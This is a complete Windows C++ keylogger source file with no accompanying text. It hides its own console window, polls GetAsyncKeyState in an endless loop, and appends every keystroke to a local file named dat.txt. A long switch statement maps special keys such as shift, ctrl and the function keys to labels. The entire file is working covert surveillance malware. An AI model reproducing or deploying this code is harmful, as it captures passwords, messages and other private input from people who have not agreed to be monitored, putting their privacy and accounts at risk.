#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>



using namespace std;



void LOG(string input) {
	fstream LogFile;
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	/*case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;*/
	/*case VK_RETURN:
		cout << "\n";
		LOG("\n");
		return true;*/
	/*case '3/4':
		cout << ".";
		LOG(".");
		return true;*/
	/*case VK_SHIFT:
		cout << "#SHIFT#";
		LOG("#SHIFT#");
		return true;*/
	/*case VK_BACK:
		cout << "\b";
		LOG("\b");
		return true;*/
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		LOG("#R_CLICK#");
		return true;

    case VK_RETURN:
    		cout << "\n";
        LOG("\n");
    		return true;
    	case VK_BACK:
    		cout << "\b";
        LOG("\b");
    		return true;
    	case VK_SPACE:
    		cout << "  ";
        LOG(" ");
    		return true;
    	case VK_SHIFT:
    		cout << "*shift*";
        LOG("*shift*");
    		return true;
    	case VK_OEM_PERIOD:
    		cout << ".";
        LOG(".");
    		return true;
    	case VK_TAB:
    		cout << "*tab*";
        LOG("*tab*");
    		return true;
    	case VK_CLEAR:
    		cout << "*clear*";
        LOG("*clear*");
    		return true;
    	case VK_CONTROL:
    		cout << "*ctrl*";
        LOG("*ctrl*");
    		return true;
    	case VK_MENU:
    		cout << "*alt*";
        LOG("*alt*");
    		return true;
    	case VK_CAPITAL:
    		cout << "*caps*";
        LOG("*caps*");
    		return true;
    	case VK_ESCAPE:
    		cout << "*escape*";
        LOG("*escape*");
        return true;
    	case VK_LEFT:
    		cout << "*left*";
        LOG("*left*");
    		return true;
    	case VK_UP:
    		cout << "*up*";
        LOG("*up*");
    		return true;
    	case VK_RIGHT:
    		cout << "*right*";
        LOG("*right*");
    		return true;
    	case VK_DOWN:
    		cout << "*down*";
        LOG("*down*");
    		return true;
    	case VK_SELECT:
    		cout << "*select*";
        LOG("*select*");
    		return true;
    /*	case VK_DEL:
    		cout << "*del*";
        LOG("*del*");
    		return true;*/
    	case VK_INSERT:
    		cout << "*ins*";
        LOG("*ins*");
    		return true;
    	case VK_LWIN:
    		cout << "*win*";
        LOG("*win*");
    		return true;
    	case VK_RWIN:
    		cout << "*win*";
        LOG("*win*");
    		return true;
    	case VK_NUMPAD0:
    		cout << "0";
        LOG("0");
    		return true;
    	case VK_NUMPAD1:
    		cout << "1";
        LOG("1");
    		return true;
    	case VK_NUMPAD2:
    		cout << "2";
        LOG("2");
    		return true;
    	case VK_NUMPAD3:
    		cout << "3";
        LOG("3");
    		return true;
    	case VK_NUMPAD4:
    		cout << "4";
        LOG("4");
    		return true;
    	case VK_NUMPAD5:
    		cout << "5";
        LOG("5");
    		return true;
    	case VK_NUMPAD6:
    		cout << "6";
        LOG("6");
    		return true;
    	case VK_NUMPAD7:
    		cout << "7";
        LOG("7");
    		return true;
    	case VK_NUMPAD8:
    		cout << "8";
        LOG("8");
    		return true;
    	case VK_NUMPAD9:
    		cout << "9";
        LOG("9");
    		return true;
    	case VK_MULTIPLY:
    		cout << "*";
        LOG("*");
    		return true;
    	case VK_ADD:
    		cout << "+";
        LOG("+");
    		return true;
    	case VK_SUBTRACT:
    		cout << "-";
        LOG("-");
    		return true;
    	case VK_DECIMAL:
    		cout << ".";
        LOG(".");
    		return true;
    	case VK_DIVIDE:
    		cout << "/";
        LOG("/");
    		return true;
    	case VK_F1:
    		cout << "f1";
        LOG("f1");
    		return true;
    	case VK_F2:
    		cout << "f2";
        LOG("f2");
    		return true;
    	case VK_F3:
    		cout << "f3";
        LOG("f3");
    		return true;
    	case VK_F4:
    		cout << "f4";
        LOG("f4");
    		return true;
    	case VK_F5:
    		cout << "f5";
        LOG("f5");
    		return true;
    	case VK_F6:
    		cout << "f6";
        LOG("f6");
    		return true;
    	case VK_F7:
    		cout << "f7";
        LOG("f7");
    		return true;
    	case VK_F8:
    		cout << "f8";
        LOG("f8");
    		return true;
    	case VK_F9:
    		cout << "f9";
        LOG("f9");
    		return true;
    	case VK_F11:
    		cout << "f11";
        LOG("f11");
    		return true;
    	case VK_F12:
    		cout << "f12";
        LOG("f12");
    		return true;
    	case VK_NUMLOCK:
    		cout << "*num-lock*";
        LOG("*num-lock*");
    		return true;
    	case VK_SCROLL:
    		cout << "*scroll-lock*";
        LOG("*scroll-lock*");
    		return true;
    	case VK_LSHIFT:
    		cout << "*left-shift*";
        LOG("*left-shift*");
    		return true;
    	case VK_RSHIFT:
    		cout << "*right-shift*";
        LOG("*right-shift*");
    		return true;
    	case VK_LCONTROL:
    		cout << "*left-ctrl*";
        LOG("*left-ctrl*");
    		return true;
    	case VK_RCONTROL:
    		cout << "*right-ctrl*";
        LOG("*right-ctrl*");
    		return true;
    	case VK_LMENU:
    		cout << "*l-alt*";
        LOG("*l-alt*");
    		return true;
    	case VK_RMENU:
    		cout << "*r-alt*";
        LOG("*r-alt*");
    		return true;
    	/*case VK_BROWSER_BACK:
    		cout << "";
    		return true;
    	case VK_BROWSER_FORWARD:
    		cout << "";
    		return true;
    	case VK_BROWSER_REFRESH:
    		cout << "";
    		return true;
    	case VK_BROWSER_STOP:
    		cout << "";
    		return true;*/
    	case VK_OEM_1:
    		cout << ";:";
        LOG(";:");
    		return true;
    	case VK_OEM_PLUS:
    		cout << "+";
        LOG("+");
    		return true;
    	case VK_OEM_COMMA:
    		cout << ",";
        LOG(",");
    		return true;
    	case VK_OEM_MINUS:
    		cout << "-";
        LOG("-");
    		return true;
    	case VK_OEM_2:
    		cout << "/?";
        LOG("/?");
    		return true;
    	case VK_OEM_3:
    		cout << "`~";
        LOG("`~");
    		return true;
    	case VK_OEM_4:
    		cout << "[{";
        LOG("[{");
    		return true;
    	case VK_OEM_5:
    		cout << "\ and |";
        LOG("\ and |");
    		return true;
    	case VK_OEM_6:
    		cout << "]}";
        LOG("]}");
    		return true;
    	case VK_OEM_7:
    		cout << "*single-quote double-quote*";
        LOG("*single-quote double-quote*");
    		return true;




	default:
		return false;
	}
}



int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';

	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {

					fstream LogFile;
					LogFile.open("dat.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
			}
		}
	}

	return 0;
}
